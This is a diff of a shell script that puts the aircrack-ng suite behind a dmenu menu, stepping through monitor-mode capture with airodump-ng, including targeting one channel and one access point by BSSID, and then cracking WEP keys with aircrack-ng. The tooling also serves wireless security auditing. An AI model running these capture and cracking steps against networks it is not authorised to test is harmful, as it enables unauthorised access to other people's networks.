@@ -3,18 +3,25 @@
 TERM=xterm
 alias dmenu='dmenu -nb "#333" -nf "#ccc" -sb "#111" -sf "#ff0"'
 
-if [ -z $(which airmon-ng) ]
-then
+
+# Only root may pass
+[ $USER = root ] || {
+    sudo $0
+    exit
+}
+
+
+hash airmon-ng 2>/dev/null || {
     cat<<EOF | xmessage -file -
 Aircrack-ng suite not installed.
 You'll also need aircrack-ng-scripts package and a compatible wireless card.
 EOF
     exit 1
-fi
+}
 
-function step() {
+step() {
     cmd=$(dmenu -l 4 -p "$1")
-    [ -z "$cmd" ] || $TERM -e sh -c "$cmd;read"
+    [ -z "$cmd" ] || $TERM -e sh -c "$cmd;echo Press any key..;read"
 }
 
 #############
@@ -37,10 +44,9 @@ exit # skip this step
 EOF
 
 cat <<EOF | step '3. Get packets with airodump-ng (keep terminal open)' &
-sudo airodump-ng mon0 -w /tmp/wificrack --ivs  # only WEP
-sudo airodump-ng mon0 -w /tmp/wificrack -c 2  --ivs # channel 2 WEP
-sudo airodump-ng mon0 -w /tmp/wificrack
-sudo airodump-ng mon0 -w /tmp/wificrack --bssid 00:11:22:33:44
+sudo airodump-ng mon0 -w ./wificrack --ivs --encrypt WEP  # only WEP
+sudo airodump-ng mon0 -w ./wificrack
+sudo airodump-ng mon0 -w ./wificrack --ivs -c 11 --bssid 00:01:E3:08:4C:9D
 exit # skip this step
 EOF
 
@@ -49,8 +55,10 @@ while pidof dmenu > /dev/null
 do sleep 0.5
 done
 
+sleep 3s # also wait for some packets
+
 cat <<EOF | step '4. Use collected packets to crack the encryption'
-aircrack-ng /tmp/wificrack*.ivs # WEP
+aircrack-ng ./wificrack*.ivs # WEP
 exit
 EOF
 
